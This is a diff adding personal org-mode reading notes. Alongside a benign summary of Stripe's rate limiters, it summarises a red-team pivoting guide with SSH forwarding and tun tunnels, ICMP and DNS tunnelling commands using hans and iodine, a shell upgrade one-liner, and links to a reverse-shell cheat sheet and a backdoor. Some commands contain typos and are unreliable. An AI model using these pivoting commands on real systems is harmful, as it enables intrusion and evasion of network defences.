@@ -1,0 +1,77 @@
+#+TITLE: April 2017 Articles
+
+* TODO [[https://pingcap.github.io/blog/2016/10/17/how-we-build-tidb/][How We Build TiDB]]                                         :db:distsys:
+* TODO [[https://medium.com/@MaartenSikkema/using-dotnet-core-orleans-redux-and-websockets-to-build-a-scalable-realtime-back-end-cd0b65ec6b4d][Building a realtime server backend using the Orleans Actor system, Dotnet Core and Server-side Redux]] :realtime:orleans:
+
+* DONE [[https://artkond.com/2017/03/23/pivoting-guide/][A Red Teamer's guide to pivoting]]                 :security:pentesting:
+  CLOSED: [2017-04-03 Mon 23:22]
+  - You've found an RCE in a web-app accessible from the internet, and have a shell.
+    - SSH port forwarding: 
+      ssh username@host -D 1080 # socks server on the local Intranet.
+      ssh username@host -L 445:192.168.1.1:445 # 445 opened on attacker's side to 445 in Intranet
+    - SSH can tunnel layer 3 traffic via established ssh channels. (need root on both machines)
+      (PermitRootLogin yes, PermitTunnel yes)
+      - ssh username@server -w any:any # create pair of tun devices
+      - tunnels created, but not activated
+        - ip addr add 1.1.1.2/32 peer 1.1.1.1 dev tun0 # client side
+        - id addrs add 1.1.1.2/32 peer 1.1.1.2 dev tun0 # server side
+        - echo 1 > /proc/sys/net/ipv4/ip_forward # enable NAT forwarding
+        - iptables -t nat -A POSTROUTING -s 1.1.1.2 -o eth0 -j MASQUERADE
+        - route add -net 10.0.0.0/16 gw 1.1.1.1 # default gateway for that network
+    - 3proxy (https://github.com/z3APA3A/3proxy/releases)
+      - can be used as socks proxy or port forwarder
+      - general swiss army knife
+    - rpivot: https://github.com/artkond/rpivot
+      - traverses NAT connections. reverse socks proxy. works like ssh -D but in opposite direction.
+  - On the internal network, limited connectivity
+    - ICMP tunneling via [[http://code.gerade.org/hans/][hans]] (need root locally since raw sockets)
+      - hans -v -f -s 1.1.1.1 -p P@ssw0rd # server side
+      - hans -f -c <server ip> -p P@ssw0rd # client side
+    - DNS tunneling
+      - WAN traffic might be blocked, but can resolve external names.
+      - If you have root, [[http://code.kryo.se/iodine/][iodine]] works almost like hans.
+        - iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com # server
+        - iodone -f -P P@ssw0rd tunneldomain.com -r # client
+        - Success yields direct visibility at 1.1.1.2.
+        - Then, using compression:
+          ssh user@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080
+      - [[https://github.com/iagox86/dnscat2][Dnscat2]] doesn't require root.
+    - Corporate HTTP proxy as way out.
+      - Rpivot, [[http://cntlm.sourceforge.net/][Cntlm]], OpenVpn over HTTP proxy.
+  - [[http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet][Reverse Shell Cheat Sheet]]
+  - Upgrade from regular semi-interactive shell:
+    =python -c 'import pty; pty.spawn("/bin/bash")'=
+  - socat
+  - [[https://github.com/creaktive/tsh][Tsh]]: small ssh-like backdoor with full-pty terminal.
+* DONE [[https://stripe.com/blog/rate-limiters][Scaling your API with rate limiters]]                          :distsys:
+  CLOSED: [2017-04-03 Mon 23:01]
+  - Rate limiting can make your API more reliable when:
+    - One of your users is responsible for a spike in traffic, but you need to stay up for others
+    - Misbehaving scripts accidentially sending you lots of request
+    - User sending lower priority stuff.
+      (This implies that you have some sort of prioritization of requests)
+    - Something wrong internally.
+  - Stripe implements a few strategies to keep the API available for everyone
+  - Not an option if spacing out requests isn't an option.
+  - During incidents, shed load by dropping low priority requests.
+  - 4 types used in production
+    - Request rate limiter (e.g. N requests per second) -- Stripe has the ability to burst a bit.
+    - Concurrent reuqests limiter (e.g. 20 requests at the same time). Helps with resource intensive requests
+    - Fleet usage load shedder
+      - Divide up traffic into critical (e.g. charges) and non-critical (list charges).
+      - Reserve fraction of requests for charges
+    - Worker utilization load shedding
+      - Divide into Critical, POSTs, GETs, Test mode traffic
+        - track workers: busy boxes will shed less critical requests
+  - How to deploy?
+    - Hook into middleware safely.
+      e.g. what happens if redis goes down, or bugs?
+    - Show good exceptions to your users 429 (Too Many Requests), 503 (Service Unavailable)
+    - Control rods
+    - Dark launch to simulate what would actually happen.
+
+*** Further thoughts
+    - Dark launches are helpful, but can't tell you exactly, since the potentially blocked traffic is still happening. This is similar to our auto scaling problem.
+      
+    
+
